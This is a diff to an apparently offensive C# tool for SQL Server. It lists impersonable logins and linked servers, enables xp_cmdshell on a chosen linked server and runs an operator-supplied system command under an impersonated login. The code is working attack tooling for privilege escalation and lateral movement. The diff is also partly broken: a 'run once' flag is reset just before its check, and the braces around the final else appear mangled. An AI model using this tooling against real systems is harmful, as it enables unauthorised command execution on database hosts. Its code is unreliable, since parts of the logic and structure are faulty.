@@ -242,13 +242,13 @@ namespace SQL
                         }
                     }
 
-                    if (choice == "7")
+                    if (choice == "6")
                     {
                         // Display list of logins to impersonate
                         Console.WriteLine("\n[+] Retrieving login mappings...\n");
 
                         // Fetch login mappings from the connected instance
-                        List<string> impersonableLogins2 = PullLoginMappings(con); // Updated variable name
+                        List<string> impersonableLogins2 = PullLoginMappings(con); // Retrieve login mappings
 
                         if (impersonableLogins2.Count == 0)
                         {
@@ -268,17 +268,25 @@ namespace SQL
                             {
                                 string selectedLogin = impersonableLogins2[loginChoice];
 
-                                // Step 1: Ask the user to input the linked server name dynamically
-                                Console.Write("[+] Enter the linked server name: ");
+                                // Step 1: List all linked servers where login impersonation is possible
+                                List<string> linkedServers = ListLinkedServers(con); // Retrieve linked servers
+                                Console.WriteLine("\n[+] Available linked servers to impersonate login:\n");
+
+                                foreach (var server in linkedServers)
+                                {
+                                    Console.WriteLine($"\t- {server}");
+                                }
+
+                                // Step 2: Ask user for the linked server and command to execute
+                                Console.Write("\n[+] Enter the linked server name from the above list: ");
                                 string linkedServer = Console.ReadLine();
 
-                                if (string.IsNullOrEmpty(linkedServer))
+                                if (string.IsNullOrEmpty(linkedServer) || !linkedServers.Contains(linkedServer))
                                 {
-                                    Console.WriteLine("[!] Linked server name cannot be empty.");
+                                    Console.WriteLine("[!] Invalid linked server name.");
                                     return;
                                 }
 
-                                // Step 2: Ask the user for the command to execute on the linked server
                                 Console.Write("[+] Enter the command to execute on the linked server: ");
                                 string userCommand = Console.ReadLine();
 
@@ -288,24 +296,34 @@ namespace SQL
                                     return;
                                 }
 
-                                // Step 3: Enable xp_cmdshell on the linked server
-                                EnableXpCmdShellOnLinkedServer(con, linkedServer);
+                                // Step 3: Enable xp_cmdshell ONCE for the linked server
+                                bool xpCmdShellEnabled = false;
+                                if (!xpCmdShellEnabled)
+                                {
+                                    EnableXpCmdShellOnLinkedServer(con, linkedServer);
+                                    xpCmdShellEnabled = true;  // Set flag to true, no need to enable again
+                                }
 
-                                // Step 4: Impersonate the selected login and execute the user-specified command
+                                // Step 4: Impersonate the login and execute the command
                                 ImpersonateLoginAndExecute(con, selectedLogin, linkedServer, userCommand);
                             }
                             else
                             {
-                                Console.WriteLine("[!] Invalid choice.");
+                                Console.WriteLine("[!] Invalid login choice.");
                             }
+
                         }
-                    }
+
+                }
+
+
+
 
 
 
                     else
                     {
-                        Console.WriteLine("[!] Invalid choice. Please enter 1, 2, or 3.");
+                        Console.WriteLine("[!] Invalid choice. Please enter 1, 2, 3, 4, 5 or 6.");
                     }
 
                 }
